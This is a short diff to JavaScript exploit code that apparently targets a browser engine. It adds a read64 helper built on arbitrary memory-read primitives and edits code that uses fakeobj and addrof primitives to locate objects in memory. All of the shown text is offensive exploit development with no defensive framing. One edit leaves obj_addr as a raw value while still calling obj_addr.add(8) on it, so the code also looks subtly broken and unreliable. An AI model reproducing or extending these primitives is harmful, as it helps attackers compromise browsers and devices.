@@ -374,6 +374,19 @@ addEventListener('unhandledrejection', event => {
         write_mem(p, arr);
     };
 
+function read64(addr) {
+    read_mem_setup(addr, 8);
+    var bytes = [];
+    for (var i = 0; i < 8; i++) {
+        bytes.push(arw_slave[i]);
+    }
+    var res = 0n;
+    for (var i = 7; i >= 0; i--) {
+        res = (res << 8n) + BigInt(bytes[i]);
+    }
+    return res;
+}
+	
     (function () {
         var magic = boot_fakeobj(boot_addrof(obj) + 16);
         magic[4] = addrof_slave;
@@ -513,16 +526,13 @@ addEventListener('unhandledrejection', event => {
   const Memory = mod.Memory;
   const Int64 = imod.Int;
 
-  function read64(addr) {
-    const bytes = window.read_mem(addr, 8);
-    return new Int64(bytes);
-  }
+
 
   const obj = { addr: null, 0: 0 };
 	 
-const obj_addr = new Int64(addrofFn(obj));
+const obj_addr =  addrofFn(obj);
 
-//const obj_addr = addrofFn(obj);  // già Int64
+ 
   const obj_bt = read64(obj_addr.add(8));
   const obj_p = obj_addr;
 
